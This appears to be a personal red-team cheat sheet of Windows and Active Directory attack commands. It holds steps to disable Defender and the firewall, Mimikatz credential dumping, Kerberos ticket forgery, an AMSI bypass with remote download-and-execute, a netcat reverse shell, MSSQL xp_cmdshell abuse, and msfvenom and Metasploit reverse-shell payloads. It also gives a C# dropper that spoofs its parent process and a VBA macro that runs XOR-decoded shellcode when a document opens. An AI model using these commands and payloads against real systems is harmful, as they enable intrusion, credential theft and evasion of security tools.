# Quick commands to work with
### Will update as I refine and play around with it, Do explore other commands, some maybe faster and easier than the ones below
---
### Disable Defender and firewall
```
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
NetSh Advfirewall set allprofiles state off
```
---
### Mimikatz
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
---
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
---
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::sam /patch" "exit"
---
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::lsa /patch" "exit"
---
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::lsa /inject /name:kerberos" "exit"
---
mimikatz.exe "kerberos::golden /user:Administrator /domain:final.com /sid:<SID of the domain ur impersonating> /krbtgt:<hash> /sids:<Enterprise admin SID> /ptt" "exit"
<SID avail in bloodhound or powerview>
---
```
---
### Rubeus
```
NT hash for given password (Required for S4U)
Rubeus.exe hash /password:Summer2018!

S4U
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/<box> /ptt

```
---
### Powershell
---
#### AMSI bypass and Code Exec
```        
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/*.ps1')| IEX;
```
---
#### Remoting
```
Invoke-command -computername <System Name> -scriptblock { c:\windows\tasks\nc.exe 192.168.x.x 443 -e cmd.exe}
```
---
#### Pivot
```
Import Powermad.ps1

New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer -Identity <boxname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

.\Rubeus.exe hash /password:Summer2018!

.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/<box> /ptt
```
---
#### SharpHound
```
(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethod All -domain <domain-name >

```
---
---
### SQL
```
mssqlclient.py <user>@<IP> -hashes :<hash> -windows-auth
mssqlclient.py <user>:<pass>@<IP> -windows-auth
---
EXECUTE as LOGIN = 'sa';EXEC sp_serveroption '<server>', 'rpc out', 'true';EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT <server>;EXEC('xp_cmdshell ''whoami'';') AT <server>
---
EXEC('xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.x.x/test.txt)'' ') AT <server>;
---
proxychains ntlmrelayx.py --no-http-server -smb2support -t <Target IP>
---
EXECUTE ('master.sys.xp_dirtree "\\<Your IP>\a"')

exec ('execute as login =''user'';EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT server1') AT server2

exec ('execute as login =''user'';EXEC (''xp_cmdshell ''''whoami'''' '') AT server1') AT server2
```
---
### PSexec
---
#### With hash / password
```
psexec.py -no-pass -hashes <hash> <domain>/<user>@<IP>
psexec.py <domain>/<user>:<pass>@<IP>
```
---
####  Importing ticket and gaining shell
```
getST.py -spn CIFS/<System IP or NAME> -impersonate '<user>' -ts <Domain>/attackersystem\$:'<password>' -dc-ip <Forest DC IP>
							OR
ticketer.py -domain-sid <SID> -nthash <hash> -domain <domain name> -spn cifs/<box> <user> 

export KRB5CCNAME=/tmp/administrator.ccache 
psexec.py user@IP -k -no-pass

Note: 
If facing issues with tickets, try editing the spn
example: -spn CIFS/box1.domain.local as -spn CIFS/box1
```
---
### Evil-WinRM
```
evil-winrm -u <domain>\\<user> -H <hash> -i <IP>
```
---
### Impacket
---
```
secretsdump.py <domain>/<user>:<pass>@<DC-IP>
ticketConverter.py win_format lin_format
```
---
### MSF
```
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
autorun
set autoroute 'route 172.16.x.0/24';
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```
---
### CrackmapExec
```
proxychains crackmapexec smb <IP> -u <box>\<user> -H <hash>
proxychains crackmapexec smb <IP> -u <user> -p <pass>
```

---
## C# payload
```
Original paylods copied from
https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
https://0x1.gitlab.io/pentesting/Defcon27-Csharp-Workshop/
```
```
using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Diagnostics;
using System.Threading;



// Might work best for testing in its own VS Solution/Project... otherwise:
// C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe ExecutionTesting.cs

// Thanks to this StackOverflow for getting me started:
// https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch

namespace Dropper
{
    class Program
    {       

        static void Main(string[] args)
        {

            string command;
            int newParentProcId;            
            
            Process[] expProc = Process.GetProcessesByName("notepad");
            if (expProc.Length == 0)
            {
                Process.Start("notepad.exe");
                Thread.Sleep(2000);
                expProc = Process.GetProcessesByName("notepad");
            }            
            newParentProcId = expProc[0].Id;

            // Modify the below to execute something else,)            
            if (args.Length != 1)
            {
                command = "powershell  [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('<code>')) | iex";
                UnmanagedExecute.CreateProcess(newParentProcId, command);
                System.Environment.Exit(1);
                return ;
            }

            command = "powershell  [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('"+args[0]+"')) | iex";
            Console.WriteLine("executing");
            UnmanagedExecute.CreateProcess(newParentProcId, command);

        }
    }

    class UnmanagedExecute
    {
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask,
           HANDLE_FLAGS dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool PeekNamedPipe(IntPtr handle,
            IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,
            ref uint bytesAvail, IntPtr BytesLeftThisMessage);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,
           uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetConsoleOutputCP();

        [DllImport("kernel32.dll")]
        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
           ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        public static bool CreateProcess(int parentProcessId, string command)
        {
            // STARTUPINFOEX members
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

            // Block non-Microsoft signed DLL's
            const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

            // STARTUPINFO members (dwFlags and wShowWindow)
            const int STARTF_USESTDHANDLES = 0x00000100;
            const int STARTF_USESHOWWINDOW = 0x00000001;
            const short SW_HIDE = 0x0000;

            // dwCreationFlags
            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_NO_WINDOW = 0x08000000;

            // WaitForSingleObject INFINITE
            const UInt32 INFINITE = 0xFFFFFFFF;
            var error = Marshal.GetLastWin32Error();

            // DuplicateHandle
            const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
            const uint DUPLICATE_SAME_ACCESS = 0x00000002;

            // https://msdn.microsoft.com/en-us/library/ms682499(VS.85).aspx
            // Handle stuff
            var saHandles = new SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            // Duplicate handle created just in case
            IntPtr hDupStdOutWrite = IntPtr.Zero;

            // Create the pipe and make sure read is not inheritable
            CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new PROCESS_INFORMATION();
            var siEx = new STARTUPINFOEX();

            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            IntPtr lpValueProc = IntPtr.Zero;
            IntPtr hSourceProcessHandle = IntPtr.Zero;

            // Values will be overwritten if parentProcessId > 0
            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    var success = InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                    if (success || lpSize == IntPtr.Zero)
                    {
                        return false;
                    }

                    siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
                    if (!success)
                    {
                        return false;
                    }

                    IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                    // Add Microsoft-only DLL protection
                    success = UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        Console.WriteLine("[!] Failed to set process mitigation policy");
                        return false;
                    }

                    IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValueProc, parentHandle);

                    success = UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValueProc,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        return false;
                    }

                    IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;
                    IntPtr hNewParent = OpenProcess(ProcessAccessFlags.DuplicateHandle, true, parentProcessId);

                    success = DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
                    if (!success)
                    {
                        error = Marshal.GetLastWin32Error();
                        return false;
                    }

                    error = Marshal.GetLastWin32Error();
                    siEx.StartupInfo.hStdError = hDupStdOutWrite;
                    siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
                }

                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);
                bool ret = CreateProcess(null, command, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
                if (!ret)
                {
                    Console.WriteLine("[!] Proccess failed to execute!");
                    return false;
                }
                SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
                var encoding = Encoding.GetEncoding(GetConsoleOutputCP());
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
                string result = "";
                bool exit = false;
                try
                {
                    do
                    {
                        if (WaitForSingleObject(pInfo.hProcess, 100) == 0)
                        {
                            exit = true;
                        }

                        char[] buf = null;
                        int bytesRead;

                        uint bytesToRead = 0;

                        bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        if (peekRet == true && bytesToRead == 0)
                        {
                            if (exit == true)
                            {
                                Console.WriteLine("Command executed.");
                                break;
                            }
                            else
                            {
                                continue;
                            }
                        }

                        if (bytesToRead > 4096)
                            bytesToRead = 4096;

                        buf = new char[bytesToRead];
                        bytesRead = reader.Read(buf, 0, buf.Length);
                        if (bytesRead > 0)
                        {
                            result += new string(buf);
                        }

                    } while (true);
                    reader.Close();
                }
                finally
                {
                    if (!safeHandle.IsClosed)
                    {
                        safeHandle.Close();
                    }
                }

                if (hStdOutRead != IntPtr.Zero)
                {
                    CloseHandle(hStdOutRead);
                }
                Console.WriteLine(result);
                return true;


            }
            finally
            {
                // Free the attribute list
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValueProc);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hThread);
                }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        enum HANDLE_FLAGS : uint
        {
            None = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }

        [Flags]
        public enum DuplicateOptions : uint
        {
            DUPLICATE_CLOSE_SOURCE = 0x00000001,
            DUPLICATE_SAME_ACCESS = 0x00000002
        }
    }
	}
```
---
Macro

```
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    
    
    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool of cas van cooten)
	' If payload more than 25 lines, split it and join as below
	
    asd = Array(buf)
     das = Array(buf)
    
    buf = Split(Join(asd, ",") & "," & Join(das, ","), ",")
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decode the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```